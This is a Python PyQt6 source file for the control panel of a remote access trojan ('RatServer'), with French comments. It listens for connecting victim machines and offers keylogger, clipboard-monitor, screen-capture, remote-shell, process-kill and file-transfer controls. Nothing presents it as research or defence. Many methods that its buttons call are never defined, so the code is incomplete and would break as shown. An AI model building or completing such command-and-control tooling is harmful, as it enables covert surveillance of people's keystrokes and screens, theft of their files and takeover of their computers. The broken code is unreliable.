import sys
import json
import socket
import threading
import base64
import os
import time
import mimetypes
import shutil
from datetime import datetime
from pathlib import Path
from PyQt6.QtWidgets import *
from PyQt6.QtCore import *
from PyQt6.QtGui import *

class RatServer(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Remote Access Tool - Control Panel")
        self.setMinimumSize(1200, 800)
        
        # Variables
        self.clients = {}
        self.current_paths = {}
        self.selected_client = None
        self.download_path = os.path.expanduser("~/Downloads")
        self.temp_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "temp")
        os.makedirs(self.temp_dir, exist_ok=True)
        
        # Style
        self.setStyleSheet("""
            QMainWindow {
                background-color: #2b2b2b;
                color: #ffffff;
            }
            QTabWidget::pane {
                border: 1px solid #444444;
                background-color: #2b2b2b;
            }
            QTabBar::tab {
                background-color: #363636;
                color: #ffffff;
                padding: 8px 20px;
                border: none;
                margin-right: 2px;
            }
            QTabBar::tab:selected {
                background-color: #0d47a1;
            }
            QTableWidget {
                background-color: #363636;
                color: #ffffff;
                gridline-color: #444444;
                border: none;
            }
            QTableWidget::item:selected {
                background-color: #0d47a1;
            }
            QHeaderView::section {
                background-color: #2b2b2b;
                color: #ffffff;
                padding: 5px;
                border: none;
            }
            QPushButton {
                background-color: #0d47a1;
                color: white;
                border: none;
                padding: 8px 15px;
                border-radius: 4px;
            }
            QPushButton:hover {
                background-color: #1565c0;
            }
            QPushButton:pressed {
                background-color: #0a3d91;
            }
            QLineEdit, QTextEdit {
                background-color: #363636;
                color: #ffffff;
                border: 1px solid #444444;
                padding: 5px;
                border-radius: 4px;
            }
            QGroupBox {
                border: 1px solid #444444;
                margin-top: 10px;
                color: #ffffff;
                font-weight: bold;
            }
            QGroupBox::title {
                subcontrol-origin: margin;
                left: 10px;
                padding: 0 3px;
            }
        """)
        
        # Layout principal
        main_widget = QWidget()
        self.setCentralWidget(main_widget)
        main_layout = QHBoxLayout(main_widget)
        
        # Panneau de gauche (Clients)
        left_panel = QWidget()
        left_layout = QVBoxLayout(left_panel)
        
        # Liste des clients
        clients_group = QGroupBox("Connected Clients")
        clients_layout = QVBoxLayout(clients_group)
        
        self.clients_table = QTableWidget()
        self.clients_table.setColumnCount(5)
        self.clients_table.setHorizontalHeaderLabels(["IP:Port", "Hostname", "OS", "CPU", "Memory"])
        self.clients_table.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.ResizeToContents)
        self.clients_table.setSelectionBehavior(QAbstractItemView.SelectionBehavior.SelectRows)
        self.clients_table.setSelectionMode(QAbstractItemView.SelectionMode.SingleSelection)
        self.clients_table.itemSelectionChanged.connect(self.on_client_selected)
        clients_layout.addWidget(self.clients_table)
        
        left_layout.addWidget(clients_group)
        
        # Panneau de droite (Tabs)
        right_panel = QWidget()
        right_layout = QVBoxLayout(right_panel)
        
        # Tabs
        tabs = QTabWidget()
        
        # Tab Système
        system_tab = QWidget()
        system_layout = QVBoxLayout(system_tab)
        
        # Informations système
        system_info_group = QGroupBox("System Information")
        system_info_layout = QFormLayout(system_info_group)
        
        self.hostname_label = QLabel("N/A")
        self.os_label = QLabel("N/A")
        self.cpu_label = QLabel("0%")
        self.memory_label = QLabel("0%")
        
        system_info_layout.addRow("Hostname:", self.hostname_label)
        system_info_layout.addRow("OS:", self.os_label)
        system_info_layout.addRow("CPU Usage:", self.cpu_label)
        system_info_layout.addRow("Memory Usage:", self.memory_label)
        
        system_layout.addWidget(system_info_group)
        
        # Processus
        processes_group = QGroupBox("Processes")
        processes_layout = QVBoxLayout(processes_group)
        
        self.process_table = QTableWidget()
        self.process_table.setColumnCount(5)
        self.process_table.setHorizontalHeaderLabels(["PID", "Name", "CPU %", "Memory %", "Status"])
        self.process_table.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.ResizeToContents)
        
        process_buttons = QHBoxLayout()
        refresh_btn = QPushButton("🔄 Refresh")
        kill_btn = QPushButton("❌ Kill Process")
        start_btn = QPushButton("▶️ Start Process")
        
        refresh_btn.clicked.connect(self.refresh_processes)
        kill_btn.clicked.connect(self.kill_process)
        start_btn.clicked.connect(self.start_process)
        
        process_buttons.addWidget(refresh_btn)
        process_buttons.addWidget(kill_btn)
        process_buttons.addWidget(start_btn)
        
        processes_layout.addWidget(self.process_table)
        processes_layout.addLayout(process_buttons)
        
        system_layout.addWidget(processes_group)
        
        # Tab Fichiers
        files_tab = QWidget()
        files_layout = QVBoxLayout(files_tab)
        
        # Navigation
        nav_layout = QHBoxLayout()
        self.path_edit = QLineEdit()
        self.path_edit.setReadOnly(True)
        nav_layout.addWidget(self.path_edit)
        
        # Boutons de navigation
        nav_buttons = QHBoxLayout()
        up_btn = QPushButton("⬆️ Up")
        refresh_files_btn = QPushButton("🔄 Refresh")
        new_dir_btn = QPushButton("📁 New Folder")
        upload_btn = QPushButton("⬆️ Upload")
        download_btn = QPushButton("⬇️ Download")
        
        up_btn.clicked.connect(self.go_up)
        refresh_files_btn.clicked.connect(self.refresh_files)
        new_dir_btn.clicked.connect(self.create_directory)
        upload_btn.clicked.connect(self.upload_file)
        download_btn.clicked.connect(self.download_selected_file)
        
        nav_buttons.addWidget(up_btn)
        nav_buttons.addWidget(refresh_files_btn)
        nav_buttons.addWidget(new_dir_btn)
        nav_buttons.addWidget(upload_btn)
        nav_buttons.addWidget(download_btn)
        
        files_layout.addLayout(nav_layout)
        files_layout.addLayout(nav_buttons)
        
        # Liste des fichiers
        self.files_table = QTableWidget()
        self.files_table.setColumnCount(4)
        self.files_table.setHorizontalHeaderLabels(["Name", "Type", "Size", "Modified"])
        self.files_table.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.ResizeToContents)
        self.files_table.itemDoubleClicked.connect(self.on_file_double_clicked)
        files_layout.addWidget(self.files_table)
        
        # Tab Surveillance
        monitoring_tab = QWidget()
        monitoring_layout = QVBoxLayout(monitoring_tab)
        
        # Keylogger
        keylogger_group = QGroupBox("Keylogger")
        keylogger_layout = QVBoxLayout(keylogger_group)
        
        keylogger_buttons = QHBoxLayout()
        start_keylogger_btn = QPushButton("▶️ Start Keylogger")
        stop_keylogger_btn = QPushButton("⏹️ Stop Keylogger")
        clear_keylog_btn = QPushButton("🗑️ Clear Log")
        
        start_keylogger_btn.clicked.connect(self.start_keylogger)
        stop_keylogger_btn.clicked.connect(self.stop_keylogger)
        clear_keylog_btn.clicked.connect(lambda: self.keylog_text.clear())
        
        keylogger_buttons.addWidget(start_keylogger_btn)
        keylogger_buttons.addWidget(stop_keylogger_btn)
        keylogger_buttons.addWidget(clear_keylog_btn)
        
        self.keylog_text = QTextEdit()
        self.keylog_text.setReadOnly(True)
        
        keylogger_layout.addLayout(keylogger_buttons)
        keylogger_layout.addWidget(self.keylog_text)
        
        monitoring_layout.addWidget(keylogger_group)
        
        # Clipboard Monitor
        clipboard_group = QGroupBox("Clipboard Monitor")
        clipboard_layout = QVBoxLayout(clipboard_group)
        
        clipboard_buttons = QHBoxLayout()
        start_clipboard_btn = QPushButton("▶️ Start Monitor")
        stop_clipboard_btn = QPushButton("⏹️ Stop Monitor")
        clear_clipboard_btn = QPushButton("🗑️ Clear Log")
        
        start_clipboard_btn.clicked.connect(self.start_clipboard_monitor)
        stop_clipboard_btn.clicked.connect(self.stop_clipboard_monitor)
        clear_clipboard_btn.clicked.connect(lambda: self.clipboard_text.clear())
        
        clipboard_buttons.addWidget(start_clipboard_btn)
        clipboard_buttons.addWidget(stop_clipboard_btn)
        clipboard_buttons.addWidget(clear_clipboard_btn)
        
        self.clipboard_text = QTextEdit()
        self.clipboard_text.setReadOnly(True)
        
        clipboard_layout.addLayout(clipboard_buttons)
        clipboard_layout.addWidget(self.clipboard_text)
        
        monitoring_layout.addWidget(clipboard_group)
        
        # Tab Remote Control
        remote_tab = QWidget()
        remote_layout = QVBoxLayout(remote_tab)
        
        # Screen Capture
        screen_group = QGroupBox("Screen Capture")
        screen_layout = QVBoxLayout(screen_group)
        
        screen_controls = QHBoxLayout()
        
        interval_layout = QHBoxLayout()
        interval_layout.addWidget(QLabel("Interval (ms):"))
        self.interval_slider = QSlider(Qt.Orientation.Horizontal)
        self.interval_slider.setRange(50, 1000)
        self.interval_slider.setValue(100)
        self.interval_slider.valueChanged.connect(self.update_interval)
        interval_layout.addWidget(self.interval_slider)
        interval_layout.addWidget(QLabel(""))  # Spacer
        
        self.start_screen_btn = QPushButton("▶️ Start Capture")
        self.stop_screen_btn = QPushButton("⏹️ Stop Capture")
        self.start_screen_btn.clicked.connect(self.start_screen_capture)
        self.stop_screen_btn.clicked.connect(self.stop_screen_capture)
        
        screen_controls.addLayout(interval_layout)
        screen_controls.addWidget(self.start_screen_btn)
        screen_controls.addWidget(self.stop_screen_btn)
        
        self.screen_label = QLabel()
        self.screen_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        
        screen_layout.addLayout(screen_controls)
        screen_layout.addWidget(self.screen_label)
        
        remote_layout.addWidget(screen_group)
        
        # Shell
        shell_group = QGroupBox("Remote Shell")
        shell_layout = QVBoxLayout(shell_group)
        
        shell_controls = QHBoxLayout()
        self.start_shell_btn = QPushButton("▶️ Start Shell")
        self.stop_shell_btn = QPushButton("⏹️ Stop Shell")
        self.start_shell_btn.clicked.connect(self.start_shell)
        self.stop_shell_btn.clicked.connect(self.stop_shell)
        
        shell_controls.addWidget(self.start_shell_btn)
        shell_controls.addWidget(self.stop_shell_btn)
        
        self.shell_output = QTextEdit()
        self.shell_output.setReadOnly(True)
        self.shell_output.setStyleSheet("font-family: monospace;")
        
        self.shell_input = QLineEdit()
        self.shell_input.setPlaceholderText("Enter command...")
        self.shell_input.returnPressed.connect(self.send_shell_command)
        
        shell_layout.addLayout(shell_controls)
        shell_layout.addWidget(self.shell_output)
        shell_layout.addWidget(self.shell_input)
        
        remote_layout.addWidget(shell_group)
        
        # Ajouter les tabs
        tabs.addTab(system_tab, "💻 System")
        tabs.addTab(files_tab, "📁 Files")
        tabs.addTab(monitoring_tab, "👁️ Monitoring")
        tabs.addTab(remote_tab, "🎮 Remote Control")
        
        # Ajouter les panneaux au layout principal
        main_layout.addWidget(left_panel, 1)
        main_layout.addWidget(tabs, 2)
        
        # Démarrer le serveur
        self.server_thread = None
        self.server_running = True
        self.start_server()
        
        # Timer pour mettre à jour l'interface
        self.update_timer = QTimer()
        self.update_timer.timeout.connect(self.update_ui)
        self.update_timer.start(1000)

    def start_server(self):
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind(('0.0.0.0', 8080))  # Accepter les connexions de toutes les interfaces
            self.server_socket.listen(5)
            
            self.server_thread = threading.Thread(target=self.accept_clients)
            self.server_thread.daemon = True
            self.server_thread.start()
            
            print("Server started on 0.0.0.0:8080")
            
        except Exception as e:
            QMessageBox.critical(self, "Error", f"Failed to start server: {str(e)}")
            self.close()

    def accept_clients(self):
        while self.server_running:
            try:
                client_socket, address = self.server_socket.accept()
                client_thread = threading.Thread(
                    target=self.handle_client,
                    args=(client_socket, address)
                )
                client_thread.daemon = True
                client_thread.start()
            except Exception as e:
                if self.server_running:
                    print(f"Error accepting client: {e}")

    def handle_client(self, client_socket, address):
        try:
            # Ajouter le client à la liste avec son socket
            addr_str = f"{address[0]}:{address[1]}"
            if addr_str not in self.clients:
                self.clients[addr_str] = {
                    'socket': client_socket,
                    'hostname': 'Unknown',
                    'os': 'Unknown',
                    'cpu': 0.0,
                    'memory': 0.0,
                    'status': 'Connected'
                }
            else:
                self.clients[addr_str]['socket'] = client_socket
                self.clients[addr_str]['status'] = 'Connected'

            while True:
                size_bytes = client_socket.recv(8)
                if not size_bytes:
                    break
                    
                size = int.from_bytes(size_bytes, byteorder='big')
                data = b""
                while len(data) < size:
                    chunk = client_socket.recv(min(4096, size - len(data)))
                    if not chunk:
                        break
                    data += chunk
                
                if not data:
                    break
                    
                message = json.loads(data.decode())
                
                if message['type'] == 'system_info':
                    self.update_client_info(address, message['data'])
                elif message['type'] == 'directory_listing':
                    self.update_directory_listing(address, message['data'])
                elif message['type'] == 'file_content':
                    self.update_file_content(address, message['data'])
                elif message['type'] == 'search_results':
                    self.update_search_results(address, message['data'])
                elif message['type'] == 'process_list':
                    self.update_process_list(address, message['data'])
                elif message['type'] == 'keylog':
                    self.update_keylog(address, message['data'])
                elif message['type'] == 'clipboard':
                    self.update_clipboard(address, message['data'])
                elif message['type'] == 'screenshot':
                    self.update_screenshot(address, message['data'])
                elif message['type'] == 'shell_output':
                    self.update_shell_output(address, message['data'])
                elif message['type'] == 'file_data':
                    self.handle_file_data(address, message['data'])
                elif message['type'] == 'ok':
                    print(f"Client {address}: {message.get('message', 'Operation successful')}")
                elif message['type'] == 'error':
                    print(f"Client {address} error: {message.get('message', 'Unknown error')}")
                    
        except Exception as e:
            print(f"Error handling client {address}: {e}")
        finally:
            self.remove_client(address)
            client_socket.close()

    def update_ui(self):
        try:
            # Mettre à jour la table des clients
            self.clients_table.setRowCount(len(self.clients))
            for row, (addr, info) in enumerate(self.clients.items()):
                self.clients_table.setItem(row, 0, QTableWidgetItem(addr))
                self.clients_table.setItem(row, 1, QTableWidgetItem(info['hostname']))
                self.clients_table.setItem(row, 2, QTableWidgetItem(info['os']))
                self.clients_table.setItem(row, 3, QTableWidgetItem(f"{info['cpu']:.1f}%"))
                self.clients_table.setItem(row, 4, QTableWidgetItem(f"{info['memory']:.1f}%"))
                
            # Mettre à jour les informations système si un client est sélectionné
            if self.selected_client and self.selected_client in self.clients:
                info = self.clients[self.selected_client]
                self.hostname_label.setText(info['hostname'])
                self.os_label.setText(info['os'])
                self.cpu_label.setText(f"{info['cpu']:.1f}%")
                self.memory_label.setText(f"{info['memory']:.1f}%")
                
        except Exception as e:
            print(f"Error updating UI: {e}")

    def on_client_selected(self):
        selected_items = self.clients_table.selectedItems()
        if selected_items:
            self.selected_client = selected_items[0].text()
            self.refresh_processes()
            self.list_directory()
        else:
            self.selected_client = None

    def send_command(self, address, command):
        """Envoie une commande à un client spécifique."""
        addr_str = f"{address[0]}:{address[1]}"
        if addr_str in self.clients:
            try:
                client = self.clients[addr_str]['socket']
                data = json.dumps(command).encode()
                size = len(data)
                client.sendall(size.to_bytes(8, byteorder='big'))
                client.sendall(data)
            except Exception as e:
                print(f"Error sending command to {addr_str}: {e}")
                self.remove_client(address)

    def update_client_info(self, address, info):
        """Met à jour les informations du client dans la liste des clients."""
        addr_str = f"{address[0]}:{address[1]}"
        if addr_str not in self.clients:
            self.clients[addr_str] = {
                'socket': None,  # Le socket sera mis à jour plus tard
                'hostname': info.get('hostname', 'Unknown'),
                'os': info.get('os', 'Unknown'),
                'cpu': info.get('cpu', 0.0),
                'memory': info.get('memory', 0.0),
                'status': 'Connected'
            }
        else:
            self.clients[addr_str].update({
                'hostname': info.get('hostname', self.clients[addr_str]['hostname']),
                'os': info.get('os', self.clients[addr_str]['os']),
                'cpu': info.get('cpu', self.clients[addr_str]['cpu']),
                'memory': info.get('memory', self.clients[addr_str]['memory']),
                'status': 'Connected'
            })

    def remove_client(self, address):
        """Supprime un client de la liste des clients."""
        addr_str = f"{address[0]}:{address[1]}"
        if addr_str in self.clients:
            print(f"Client {addr_str} disconnected")
            if addr_str in self.clients:
                del self.clients[addr_str]
            if addr_str in self.current_paths:
                del self.current_paths[addr_str]
            if addr_str == self.selected_client:
                self.selected_client = None
                self.path_edit.clear()
                self.files_table.setRowCount(0)
                self.process_table.setRowCount(0)
                self.keylog_text.clear()
                self.clipboard_text.clear()
                self.shell_output.clear()
                self.hostname_label.setText("N/A")
                self.os_label.setText("N/A")
                self.cpu_label.setText("0%")
                self.memory_label.setText("0%")

    def closeEvent(self, event):
        self.server_running = False
        if hasattr(self, 'server_socket'):
            self.server_socket.close()
        event.accept()

if __name__ == '__main__':
    app = QApplication(sys.argv)
    window = RatServer()
    window.show()
    sys.exit(app.exec()) 